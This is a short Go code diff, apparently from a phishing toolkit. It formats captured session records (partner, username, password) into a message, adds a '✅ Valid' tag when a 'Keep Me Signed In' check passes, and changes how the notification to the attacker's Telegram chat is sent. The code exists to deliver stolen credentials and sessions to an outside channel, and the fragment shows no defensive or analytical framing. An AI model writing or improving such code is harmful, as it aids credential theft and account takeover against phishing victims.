@@ -262,7 +262,13 @@ func formatSessionMessage(session TSession) string {
 			}
 		}
 	}
-	return fmt.Sprintf("✨ Session Information ✨\n\n"+
+
+	validMarker := ""
+	if checkKMSI(session) {
+		validMarker = "✅ Valid\n\n"
+	}
+	return fmt.Sprintf(validMarker+
+		"✨ Session Information ✨\n\n"+
 		"🤝 Partner:       ➖ %s\n"+
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
@@ -309,7 +315,7 @@ func Notify(session TSession, chatid string, teletoken string) {
 				}
 				os.Remove(txtFilePath)
 			} else {
-				err = editMessageCaption(chatid, teletoken, messageID, msg_body)
+				err = editMessageText(chatid, teletoken, messageID, msg_body)
 				if err != nil {
 					fmt.Printf("Error editing message: %v\n", err)
 				}
